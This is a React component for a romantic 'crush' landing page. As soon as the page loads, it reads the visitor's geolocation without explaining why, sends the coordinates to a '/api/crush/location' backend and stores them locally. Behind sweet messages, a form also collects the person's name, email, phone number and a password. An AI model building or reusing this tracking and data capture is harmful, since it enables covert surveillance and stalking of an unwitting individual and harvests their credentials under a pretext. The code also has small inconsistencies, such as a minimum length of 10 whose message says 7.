import './landingPage.css';
import 'react-toastify/dist/ReactToastify.css';
import React, { useState, useEffect ,useCallback , useRef} from 'react';
import { useForm } from 'react-hook-form';
import { useNavigate } from 'react-router-dom';
import axios from 'axios';
import { toast, ToastContainer, Slide } from 'react-toastify';

const LandingPage = ({ dotstate ,crushName , setcrushName }) => {
  const {handleSubmit,formState,register} = useForm() ; // initializing the form to take data...
  const navigate = useNavigate() ;
  const [imageLinks, setImageLinks] = useState([]);

  // for handling the location fetching state...
  const [locationFetched, setLocationFetched] = useState(false);
  const isFetching = useRef(false);
  const textArray = ['Every moment spent with you is like a beautiful dream come true.','If I could rearrange the alphabet, I’d put U and I together.','You must be a magician because whenever I look at you, everyone else disappears.','If beauty were a crime, you’d be serving a life sentence.','You’re like a fine wine; the more of you I drink in, the better I feel.','If I could be any part of you, I’d be your smile.','Do you have a map? Because I just got lost in your eyes.','You must be tired because you’ve been running through my mind all day.','I just wanna spend some Sunsets with You...'];

  // function for simulating the delay...
  const delay = (sec) => new Promise((resolve) => setTimeout(resolve, sec * 1000));

  const handleSubmittion = useCallback(async (formData) => {
    try {
      const response = await axios.post('/api/crush/information', formData);
      console.log(response.statusText);
      if (response.status === 200) {
        toast.success(`${response.message}${dotstate}`, { onClose: () => { navigate('/location-setter') } }); // will decide where to navigate...
        setcrushName(formData.CuteName) ; // setting crushName...
        await delay(4) ; // Ensure to await the delay if necessary...
      } else  toast.error(`${response.statusText}`)  ;
    } catch (error) {
      console.error('An error occurred:', error);
      toast.error('error occurred Data proccessing Please try again.'); // Optional: Notify user of error
    }
  }, []);
  
  useEffect(() => {
      async function requestForImages() {
          try {
              const response = await axios.get('/api/generate_randomImages'); // Have setted the proxy in package.json
              const responseArray = response.data.data ; 
              setImageLinks(responseArray); // Spread operator to create a new array
          } catch (error) { 
              console.error('An Error occurred in making request from FRONTEND:', error);
          }
      }
      // requestForImages();
  }, []);
  // logic to send crush coordinates to the backend...
  useEffect(() => {
    const captureCoordinatesOfCrush = () => {
      try {
        if ('geolocation' in navigator && !locationFetched && !isFetching.current) {
          isFetching.current = true ;
          navigator.geolocation.getCurrentPosition(async (position) => {
            const { latitude, longitude } = position.coords; // destructuring the latitude and longitude from from coords...
            const locationResponse = await axios.post('/api/crush/location',{latitude:latitude , longitude:longitude});
            if (locationResponse.status === 200) { 
              console.log('Crush Location is successfully transfered to backend...') ;
              localStorage.setItem('crushCoordinates', JSON.stringify({ latitude: latitude, longitude: longitude }));
            }
            else console.log('Error in sending crush location to backend...') ;
            setLocationFetched(true) ;
            isFetching.current = false ;
          })
        }
      } catch (error) {
        console.log('Error in location capturing proccess...') ;
      }
    }
    captureCoordinatesOfCrush();
  }, [locationFetched,isFetching])
  

  return (
    <>
    <ToastContainer
        autoClose={4000}
        icon={true}
        hideProgressBar={false}
        closeOnClick={true}
        newestOnTop={true}
        closeButton={true}
        position='top-right'
        transition={Slide} // Smooth transition...
      />
      <div id='heading'>🌟 Welcome! Hover over each card to discover exciting messages just for you{dotstate}</div>
      <div className='container'>
      {Array.isArray(imageLinks) && imageLinks.length > 0 && imageLinks.map((imageLink, index) => (
        <div key={index + 1} className='card'><img src={imageLink} alt="img" /><div>{textArray[index]}</div>
        </div>
      ))}

      </div>
      <div className='lowerSection'>
        <h2><b>Time to Explore More About this Software !!!</b></h2>
        <div id='main'>
          <div>
            <p>
            Hey {crushName}, I just wanted to take a moment to share how much effort I put into creating this special software just for you. I poured my heart and soul into it, working late nights and weekends to ensure every detail was perfect. This platform is designed to bring a smile to your face with beautiful images and sweet messages that pop up as you explore. I wanted it to be a place where you could feel appreciated and cherished, just like you deserve. The software also allows for seamless interaction and exploration, making it easy for you to navigate through the delightful surprises I’ve crafted. I truly hope it brings you as much joy as you bring to my life! . Also if you'll say yes , then by using this software itself you can fix our first Date . we'll make it more meaningfull between us...
            </p>
          </div>
          <div id='RightBox'>
          <form onSubmit={handleSubmit(handleSubmittion)} className='Input_Box'>
            <span id='header'><span>wanna know More about you</span><video id='heartBeat' autoPlay loop muted src="/heartBeat.mp4"></video></span>
            <hr />
            <span>Your Good_Name</span>
            <input type="text" placeholder={`Enter your CuteName ${crushName}`} {...register('CuteName', {
              required: { value: true, message: 'This Field is required for Name recognition...' },
              minLength: { value: 10, message: 'Username must be at least 7 characters long...' }
            })} />
            {formState.errors.CuteName && (
              <div className='Red'><img src="./Images/warning.png" alt="img" /><span>{formState.errors.CuteName.message}</span></div>
            )}
            <span>Email-Id</span>
            <input type="email" placeholder='Enter your personal Email_Id' {...register('Email_Id', {
              required: { value: true, message: 'This Field is required for Notification logic of this software...' },
              pattern: { value: /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/, message: 'Invalid email format...' }
            })} />
            {formState.errors.Email_Id && (
              <div className='Red'><img src="./Images/warning.png" alt="img" /><span>{formState.errors.Email_Id.message}</span></div>
            )}
            <span>Phone-Number</span>
            <input type="tel" placeholder='Enter your PhoneNumber' {...register('PhoneNumber', {
              required: { value: true, message: 'This Field is required for Contact...' },
              pattern: { value: /^\d{10}$/, message: 'Phone number must be 10 digits' }
            })} />
            {formState.errors.PhoneNumber && (
              <div className='Red'><img src="./Images/warning.png" alt="img" /><span>{formState.errors.PhoneNumber.message}</span></div>
            )}
            <span>Password</span>
            <input type="password" placeholder='Enter Strong Password' {...register('Password', {
              required: { value: true, message: 'This Field is required for Security...' },
              minLength: { value: 8, message: 'Password must be at least 8 characters' },
              maxLength: { value: 20, message: 'Password must not be more than 20' },
            })} />
            {formState.errors.Password && (
              <div className='Red'><img src="./Images/warning.png" alt="img" /><span>{formState.errors.Password.message}</span></div>
            )}
            <button disabled={formState.isSubmitting} id='MainBtn' type="submit">DONE</button>
          </form>
          </div>
        </div>
      </div>
    </>
  );
}

export default LandingPage;